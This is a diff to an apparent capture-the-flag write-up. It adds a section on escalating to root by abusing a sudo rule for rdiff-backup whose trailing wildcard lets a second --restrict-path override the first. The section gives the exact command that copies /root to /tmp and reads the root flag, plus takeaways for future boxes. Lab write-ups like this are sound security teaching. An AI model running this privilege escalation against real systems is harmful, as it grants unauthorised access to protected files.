@@ -220,7 +220,9 @@ three things matter here:
 - `*` — wildcard at the end, owen can append anything
 **how rdiff-backup works*
 ```bash 
-rdiff-backup server --help
+rdiff-backup server --help #get help on the utility
+rdiff-backup server --help #the server mode - what flags it accept
+
 ```
 
 rdiff-backup has a **client/server model**. when backing up over SSH it:
@@ -231,6 +233,83 @@ rdiff-backup has a **client/server model**. when backing up over SSH it:
 
 `--remote-schema` lets you define the command used to spawn the server. `%s` is a placeholder that gets replaced with the **source path**.
 
+so rdiff-backup has two modes:
+
+**server mode** - spawned on the "remote" side, reads/writes files
+
+```
+--restrict-path DIR_PATH    restrict remote access to given path
+--restrict-mode             read-write / read-only / update-only
+```
+
+**client mode** — the side you interact with, tells the server what to do. uses `--remote-schema` to define how to spawn the server, and `%s` as a placeholder for the source path.
+
+the `[[USER@]SERVER::]PATH` syntax:
+
+```
+/::/root
+↑    ↑
+|    └── path to read on the "remote"
+└── empty hostname = localhost
+```
+
+no SSH needed — `::` with no hostname spawns the server locally.
+
+---
+
+#### the vulnerability
+
+**argparse last-value-wins.**
+
+`--restrict-path` only accepts one value. when you pass it twice, argparse silently takes the last one and discards the first.
+
+the sudo rule hardcodes `--restrict-path /opt/backup` — but the `*` wildcard lets owen inject a second `--restrict-path` which **overwrites** the first.
+
+---
+
+#### the exploit
+
+bash
+
+```bash
+rdiff-backup --remote-schema \
+  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
+  backup /::/root /tmp/rootbak
+```
+
+what actually runs as root:
+
+bash
+
+```bash
+sudo /usr/bin/rdiff-backup --server \
+  --restrict-path /opt/backup \   # ← from sudo rule (gets ignored)
+  --restrict-mode read-only \
+  --restrict-path /root           # ← injected via %s (wins)
+```
+
+result: server is now restricted to `/root` instead of `/opt/backup` — reads root's entire home directory and mirrors it to `/tmp/rootbak`.
+
+bash
+
+```bash
+cat /tmp/rootbak/root.txt  # gg
+```
+
+---
+
+#### vulnerability class
+
+**Sudo wildcard argument injection** — the `*` in a sudo rule allows appending arbitrary flags, including ones that override security restrictions already defined in the rule.
+
+---
+
+#### key takeaways for future boxes
+
+- always check `sudo -l` for wildcards (`*`)
+- wildcards at the end of a sudo rule = you control everything after the fixed flags
+- look for flags that can be passed twice where the second one overrides the first
+- `--remote-schema` + `%s` + `/::/path` = localhost server spawn without SSH
 ## Root Flag
 
 ```bash
